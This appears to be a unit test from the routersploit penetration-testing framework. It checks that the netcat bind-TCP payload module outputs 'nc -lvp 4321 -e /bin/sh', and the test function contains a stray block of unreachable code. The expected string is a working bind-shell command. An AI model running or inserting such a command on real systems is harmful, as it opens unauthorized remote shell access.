from routersploit.modules.payloads.cmd.netcat_bind_tcp import Payload
bind_tcp = 'nc -lvp 4321 -e /bin/sh'

def test_payload_generation():
    if False:
        i = 10
        return i + 15
    ' Test scenario - payload generation '
    payload = Payload()
    payload.rport = 4321
    assert payload.run() == bind_tcp